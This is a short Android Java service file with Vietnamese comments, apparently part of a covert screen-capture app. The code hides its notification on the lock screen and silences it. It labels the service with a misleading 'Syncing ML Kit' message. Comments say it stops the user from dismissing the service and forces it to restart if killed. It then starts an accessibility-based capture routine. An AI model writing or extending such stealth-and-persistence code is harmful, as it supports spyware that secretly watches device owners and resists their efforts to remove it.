package com.omega.host;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class HostService extends Service {
    @Override
    public int onStartCommand(Intent i, int f, int s) {
        // 🛡️ BỌC THÉP CẤP ĐỘ HỆ THỐNG: ÉP THÔNG BÁO CÓ ĐỘ ƯU TIÊN CAO NHẤT
        String channelId = "omega_stealth_core";
        NotificationChannel c = new NotificationChannel(
            channelId, 
            "Omega Core", 
            NotificationManager.IMPORTANCE_HIGH // Ép OS coi đây là tiến trình sống còn
        );
        c.setLockscreenVisibility(Notification.VISIBILITY_SECRET); // Ẩn trên màn hình khóa (Stealth)
        c.setSound(null, null); // Tắt âm thanh thông báo (Silent)
        getSystemService(NotificationManager.class).createNotificationChannel(c);

        Notification n = new Notification.Builder(this, channelId)
            .setContentTitle("Omega Host")
            .setContentText("Đang đồng bộ hóa ML Kit...")
            .setSmallIcon(android.R.drawable.ic_menu_compass) // Icon hệ thống an toàn
            .setOngoing(true) // 🩸 TỪ KHÓA SINH TỬ: Cấm OS và User vuốt tắt thông báo
            .setShowWhen(false)
            .build();
            
        startForeground(1, n);
        
        // Gọi Accessibility bắt đầu quét
        HostAccessibility.startCapture(i.getIntExtra("code",-1), (Intent)i.getParcelableExtra("data"));
        
        // 🩸 ÉP TIẾN TRÌNH TỰ HỒI SINH NẾU BỊ GIẾT
        return START_STICKY; 
    }
    
    @Override public IBinder onBind(Intent i) { return null; }
}